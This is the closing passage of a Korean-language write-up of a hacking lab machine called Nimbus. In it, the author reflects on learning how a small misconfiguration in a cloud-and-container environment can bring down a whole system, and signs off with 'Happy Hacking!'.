그래도 Nimbus는 내가 3일 동안 쏟아부은 시간이 전혀 아깝지 않을 만큼 엄청난 배움을 준 머신이다. 클라우드와 컨테이너가 결합된 현대적인 인프라 환경에서, 사소한 설정 미스 하나가 어떻게 시스템 전체의 붕괴로 이어지는지 완벽하게 배울 수 있었다. 

다음에는 또 어떤 기상천외한 환경이 기다리고 있을지 기대하며(사실 조금 두렵기도 하지만) Write-up을 마친다!

Happy Hacking!